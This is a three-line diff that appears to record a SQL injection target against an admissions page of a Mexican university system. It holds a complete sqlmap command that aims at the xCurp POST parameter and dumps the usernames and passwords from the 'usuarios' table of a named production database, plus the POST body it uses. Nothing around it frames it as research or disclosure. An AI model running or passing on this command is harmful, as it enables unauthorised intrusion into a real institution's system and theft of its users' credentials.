@@ -1,0 +1,3 @@
+https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/proceso_interesado_entrevistas.jsp?xModalidadP=N (POST)  # /usr/bin/sqlmap -u https://sito.utslp.edu.mx/jsp/escolar/proceso_admision/proceso_interesado_entrevistas.jsp?xModalidadP=N --method POST --data=xCurp=AAAAAAAAAAAAAAAAAA&yAccion=VCURP -p xCurp -D Sito_Sanluis_productivo -T usuarios -C usuario,password --dump --batch
+
+xCurp=AAAAAAAAAAAAAAAAAA&yAccion=VCURP
